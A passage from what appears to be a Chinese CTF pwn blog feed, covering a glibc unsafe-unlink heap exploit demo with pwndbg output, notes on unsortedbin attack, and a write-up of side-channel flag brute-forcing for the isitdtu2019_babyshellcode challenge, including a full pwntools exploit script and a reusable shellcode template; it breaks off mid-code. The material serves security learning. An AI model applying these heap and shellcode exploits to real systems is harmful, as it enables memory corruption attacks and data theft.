class="line">&#125;</span><br></pre></td></tr></table></figure><p>很多时候都会使用一个全局的<code>chunk_list</code>来管理各个<code>chunk</code>，而这也给了<code>unsafe unlink</code>可乘之机，直接开始调试<br>进行到0x421那一行后，我们看堆布局<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559af0</span><br><span class="line">Size: 0x20510 (with flag bits: 0x20511)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/30gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555555592a0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555592b0: 0x0000555555558028      0x0000555555558030</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559370: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; p &amp;chunk_list</span><br><span class="line">$2 = (uint64_t (*)[8]) 0x555555558040 &lt;chunk_list&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们在chunk0内部造了一个fakechunk，size为0x420<br>我们将<code>fakechunk-&gt;fd</code>设置为<code>chunk_list-0x18</code>，将<code>fakechunk-&gt;bk</code>设置为<code>chunk_list-0x10</code>，这样一来，检查<code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code>也就通过了，因为<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(chunk_list-0x18)-&gt;bk == chunk_list-0x18+0x18 == chunk_list == (chunk_list-0x10)-&gt;fd == chunk_list-0x10+0x10</span><br></pre></td></tr></table></figure><p><code>chunk_list[0]</code>索引的正是这里的<code>P</code><br>然后我们还需要修改后续chunk1的<code>presize</code>，因为是通过其<code>presize</code>来定位前一个<code>chunk</code>的堆头的，然后还要设置其<code>previous_in_use</code>位为false，以便于让fakechunk看起来是一个free的chunk<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x5555555596c0</span><br><span class="line">0x5555555596c0: 0x0000000000000420      0x0000000000000430</span><br><span class="line">0x5555555596d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555596f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559700: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559730: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559740: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559750: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559760: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559770: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559780: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559790: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555597a0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>这样一来便绕过了<code>size vs. prev_size</code>的检查（前面已经设置fakechunk的<code>size(with flag bits)</code>为0x421），这时候只需<code>free</code>掉chunk1，就会触发<code>unlink</code><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>我们看实际效果<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2gx chunk_list</span><br><span class="line">0x555555558040 &lt;chunk_list&gt;:    0x0000555555558028      0x00005555555596d0</span><br></pre></td></tr></table></figure><p>可以看到<code>chunk_list[0]</code>被写入了<code>chunk_list-0x18</code>，这时候我们其实就可以利用这个全局<code>chunk_list</code>来进行任意地址写了<br>看demo中的简单利用<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> victim_str[<span class="number">8</span>] = <span class="string">&quot;victim&quot;</span>;</span><br><span class="line"><span class="type">char</span> hacked[<span class="number">8</span>] = <span class="string">&quot;hacked&quot;</span>;</span><br><span class="line">*((<span class="type">uint64_t</span>*)chunk_list[<span class="number">0</span>]+<span class="number">3</span>) = (<span class="type">uint64_t</span>) victim_str;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------- original vaule of victim_str is -------\n%s\n&quot;</span>, victim_str);</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)chunk_list[<span class="number">0</span>], hacked);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------- new vaule of victim_str is      -------\n%s\n&quot;</span>, victim_str);</span><br></pre></td></tr></table></figure><p><code>*((uint64_t*)chunk_list[0]+3)</code>其实就是<code>((uint64_t*)chunk_list[0])[3]</code>，这里也就是向<code>chunk_list-0x18+0x18</code>也就是<code>chunk_list[0]</code>写入一个地址，后续使用<code>chunk_list[0]</code>来进行写入的时候，也就实现了任意地址写<br>看最后demo运行效果<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">------- original vaule of victim_str is -------</span><br><span class="line">victim</span><br><span class="line">------- new vaule of victim_str is      -------</span><br><span class="line">hacked</span><br></pre></td></tr></table></figure><h2 id="0x02-关于unsortedbin-attack"><a href="#0x02-关于unsortedbin-attack" class="headerlink" title="0x02 关于unsortedbin attack"></a>0x02 关于unsortedbin attack</h2><p>稍微回顾一下, <code>unsorted bin</code>也是以双向链表的方式进行组织的，和<code>fastbin</code>不同的是其分配方式是<code>FIFO</code>，即一个chunk放入<code>unsorted bin</code>链时将该堆块插入链表头，而从这个链取堆块的时候是从尾部开始的，因此<code>unsorted bin</code>遍历堆块的时候使用的是<code>bk</code>指针<br><code>unsortedbin attack</code>其实也是利用<code>unlink</code>操作，我们看<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>这里换而言之，如果我们控制了 <code>bk</code> 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址<br>这个<code>unsorted_chunks (av)</code>的值，其实是<code>main_arena</code>的某个偏移处，可以修改<code>global_max_fast</code>，或者向题目存在的<code>chunk_list</code>写入<code>main_arena</code>地址<br>然而在高版本加入双向链表完整性检查机制后，这基本已经被宣判了死刑，关于<code>unsortedbin</code>使用的更多的一般是<code>unsortedbin leak</code>了，所以不再赘述<br></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> unsortedbin attack </category>
          
          <category> unlink </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次侧信道攻击</title>
      <link href="/2025/08/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
      <url>/2025/08/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-关于侧信道攻击"><a href="#0x00-关于侧信道攻击" class="headerlink" title="0x00 关于侧信道攻击"></a>0x00 关于侧信道攻击</h2><p>侧信道攻击（Side-Channel Attack）是一类不直接破解算法本身，而是通过分析系统在运行过程中泄露的物理信息来推测机密数据的攻击方式。<br>常见的侧信道信息包括：<br>时间（Time）：执行时间的差异可能泄露数据，比如加密运算时间与密钥值有关。<br>功耗（Power）：芯片运算时功耗变化可反推出密钥（DPA&#x2F;SPA）。<br>电磁辐射（EM）：运行时发出的电磁波可被采集分析。<br>声学（Acoustic）：设备运行的声音差异可能泄露信息（如打印机、键盘声）。<br>缓存行为（Cache）：缓存命中&#x2F;缺失模式可被利用（如 Spectre、Meltdown）。<br> —- 摘取自ChatGPT-5</p><h2 id="0x01-pwn中的侧信道爆破"><a href="#0x01-pwn中的侧信道爆破" class="headerlink" title="0x01 pwn中的侧信道爆破"></a>0x01 pwn中的侧信道爆破</h2><p>在pwn中，侧信道攻击的主要应用通常就是shellcode领域的侧信道爆破<br>什么时候使用侧信道爆破呢？在能使用shellcode直接getshell时当然不需要，在沙箱环境下可以orw时候自然也不需要，然而，如果<code>write</code>也被禁用怎么办呢？这时候就可以使用侧信道爆破了<br>我们使用<code>open</code>和<code>read</code>来讲flag读取到一片可读写的内存上，然后布置一段爆破flag的shellcode<br>我们通过cmp指令来判断给出的一个字符和flag的对应位是否相同，相同则跳回cmp指令处，这样如果这一位正确，那么程序便会进入死循环，我们判断一秒内是否接收到信息来判断程序是否死循环，便得知这一位是否正确<br></p><h2 id="0x02-isitdtu2019-babyshellcode"><a href="#0x02-isitdtu2019-babyshellcode" class="headerlink" title="0x02 isitdtu2019_babyshellcode"></a>0x02 isitdtu2019_babyshellcode</h2><p>参考<a href="https://www.roderickchan.cn/zh-cn/2021-12-11-isitdtu2019-babyshellcode/">Isitdtu2019_babyshellcode | roderick - record and learn!</a> (<del>似乎就是提出house of apple的大师傅</del>)<br>先放题目<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">sub_AA0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int128 v10; <span class="comment">// [rsp-8h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+8h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+10h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v11 = a2;</span><br><span class="line">  *((_QWORD *)&amp;v10 + <span class="number">1</span>) = a3;</span><br><span class="line">  v12 = <span class="number">0x67616C662FL</span>L;</span><br><span class="line">  result = sys_access((<span class="type">const</span> <span class="type">char</span> *)&amp;v12, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sys_mmap(<span class="number">0xCAFE000u</span>LL, <span class="number">0x1000u</span>LL, <span class="number">7uLL</span>, <span class="number">0x32u</span>LL, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    v11 = <span class="number">0x67616C662FL</span>L;</span><br><span class="line">    v5 = sys_open((<span class="type">const</span> <span class="type">char</span> *)&amp;v11, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = sys_read(v5, (<span class="type">char</span> *)<span class="number">0xCAFE000</span>, <span class="number">0x30u</span>LL);</span><br><span class="line">    BYTE13(v10) = <span class="number">0</span>;</span><br><span class="line">    HIWORD(v10) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;v10, <span class="string">&quot;/dev/urandom&quot;</span>);</span><br><span class="line">    v7 = sys_read(sys_open((<span class="type">const</span> <span class="type">char</span> *)&amp;v10, <span class="number">0</span>, <span class="number">0</span>), (<span class="type">char</span> *)<span class="number">0xCAFE050</span>, <span class="number">8uLL</span>);</span><br><span class="line">    v8 = MEMORY[<span class="number">0xCAFE050</span>];</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">212852736LL</span>; i &lt; <span class="number">0xCAFE030</span>; i += <span class="number">8LL</span> )</span><br><span class="line">      *(_QWORD *)i ^= v8;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    MEMORY[<span class="number">0xCAFE050</span>] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将flag读取到了<code>0xCAFE000</code>，然后取了八字节随机值存储于<code>0xCAFE050</code>作为<code>key</code>，接着将<code>flag</code>每八字节异或<code>key</code>，是一个非常简单的加密，异或是可逆的<br>我们这里有一个预先信息就是<code>flag</code>是GUID值，那么<code>flag</code>长度便是0x2a，并且<code>flag&#123;&#125;</code>中的值只可能是<code>0123456789abcdef-</code>中的一个（此题的特例，正常如果未知的话还是要爆破所有可打印字符的）<br>那么我们的思路就是先还原出<code>key</code>，再利用<code>key</code>来还原<code>flag</code><br>我们知道<code>flag</code>的前四字节肯定是“flag”，那么将<code>0xCAFE000</code>的前四字节异或上”flag”便可以还原出<code>key</code>的前四字节，然后由于<code>flag</code>的长度原因，其0x30的空间并没有全部填满，后续都是0，那么与0异或是不会改变原值的，那么<code>0xCAFE000</code>到<code>0xCAFE030</code>的最后四字节便是<code>key</code>，于是我们得到了<code>key</code>，那么再对<code>0xCAFE000</code>到<code>0xCAFE030</code>每八字节按位异或<code>key</code>便还原了<code>flag</code>，接下来就是侧信道爆破了<br>主函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  dest = (<span class="type">char</span> *)mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dest == (<span class="type">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;Could not mmap&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_BFA();</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, &amp;unk_202020, <span class="number">0x27u</span>LL);</span><br><span class="line">    sub_C39(dest + <span class="number">39</span>, <span class="number">70LL</span>);</span><br><span class="line">    sub_BB5();</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是执行我们输入的shellcode，但是禁止了除了alarm以外的系统调用，我们可以先调用alarm将时间限制取消<br>注意<code>unk_202020</code>处的指令会先执行，将寄存器基本全部清空了<br>我们直接放exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6_2.27-3ubuntu1.6_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;node5.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">27189</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = start()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your exploit here</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov al, 0x25</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ebp, 0xcafe000</span></span><br><span class="line"><span class="string">    mov eax, dword ptr [rbp]</span></span><br><span class="line"><span class="string">    xor eax, 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx, dword ptr [rbp+0x2c]</span></span><br><span class="line"><span class="string">    shl rbx, 32</span></span><br><span class="line"><span class="string">    or rbx, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">L1:</span></span><br><span class="line"><span class="string">    xor qword ptr [rbp + 8 * rdx], rbx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    cmp dl, 6</span></span><br><span class="line"><span class="string">    jnz L1</span></span><br><span class="line"><span class="string">L2:</span></span><br><span class="line"><span class="string">    cmp byte ptr [rbp + &#123;&#125;], &#123;&#125;</span></span><br><span class="line"><span class="string">    jz L2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">idx = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2a</span>):</span><br><span class="line">    err = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytearray</span>(<span class="string">b&quot;-&#123;&#123;&#125;&#125;flagbcde0123456789&quot;</span>):</span><br><span class="line">        io = start()</span><br><span class="line">        io.send(asm(shellcode.<span class="built_in">format</span>(idx, <span class="built_in">hex</span>(i))))</span><br><span class="line">        <span class="keyword">if</span> io.can_recv_raw(<span class="number">1</span>):</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            log.success(<span class="string">f&quot;got flag --&gt; <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            err = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> err:</span><br><span class="line">        error(<span class="string">&quot;This round is wrong!&quot;</span>)</span><br><span class="line">    idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    cmp byte ptr [rbp + &#123;&#125;], &#123;&#125;</span><br><span class="line">    jz L2</span><br></pre></td></tr></table></figure><p>这里就是取我们尝试字符与<code>flag</code>的对应位置比较，如果正确则继续比较，这样就会陷入死循环<br>然后这里<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> io.can_recv_raw(<span class="number">1</span>):</span><br></pre></td></tr></table></figure><p><code>io.can_recv_raw(timeout)</code>是用于检测timeout时间内是否有套接字可读，我们可以很方便的用于判断程序是否在死循环<br></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>orw缺w进行侧信道爆破的模版<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    push 0x67616c66          # 将字符串 &#x27;flag&#x27; 的 ASCII 值（逆序）压入栈中（0x67616c66 是 &#x27;flag&#x27; 的十六进制表示，注意低字节优先）</span><br><span class="line">    mov rdi, rsp             # 将栈顶的地址（即 &#x27;flag&#x27; 的地址）加载到 rdi 中，作为 open() 的文件名参数</span><br><span class="line">    xor esi, esi             # 将 esi 清零，等价于将 rsi 置为 0，表示文件权限为只读 (O_RDONLY)</span><br><span class="line">    push 2                   # 将常数 2 压入栈，用于设置 rax 的值为 2（open 系统调用号）</span><br><span class="line">    pop rax                  # 从栈中弹出值 2 到 rax 中，设置 rax = 2（即 open() 系统调用号）</span><br><span class="line">    syscall                  # 执行 syscall，调用 open()，打开 &#x27;flag&#x27; 文件</span><br><span class="line">                             # 如果文件成功打开，文件描述符存储在 rax 中</span><br><span class="line"></span><br><span class="line">    mov rdi, rax             # 将文件描述符（即 open() 返回的 rax 值）存入 rdi，作为 read() 的文件描述符参数</span><br><span class="line">    mov rsi, rsp             # 将栈顶地址存入 rsi，作为 read() 的缓冲区参数</span><br><span class="line">    mov edx, 0x100           # 设置 edx = 0x100（即 256），表示最多读取 256 字节</span><br><span class="line">    xor eax, eax             # 清零 rax，设置 rax = 0，表示调用 read() 系统调用</span><br><span class="line">    syscall                  # 执行 syscall，调用 read()，读取文件内容到栈上的缓冲区</span><br><span class="line"></span><br><span class="line">    mov dl, [rsp + &#123;&#125;]       # 将栈中偏移 &#123;&#125; 处的一个字节加载到 dl 中，注意 &#123;&#125; 是动态参数（偏移值）</span><br><span class="line">    cmp dl, &#123;&#125;               # 比较 dl 中的值和 &#123;&#125;（即传入的常量值），注意 &#123;&#125; 是动态参数（要比较的值）</span><br><span class="line">    jbe $                    # 如果 dl 的值小于等于传入的常量值 &#123;&#125;，就陷入死循环（$ 表示当前指令地址，导致无限循环）</span><br><span class="line">    &quot;&quot;&quot;.format(i, c)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>根据具体情境相应调整<br>然后给出一版二分法优化的版本<br></p><figure class="highlight python"><table><tr><td 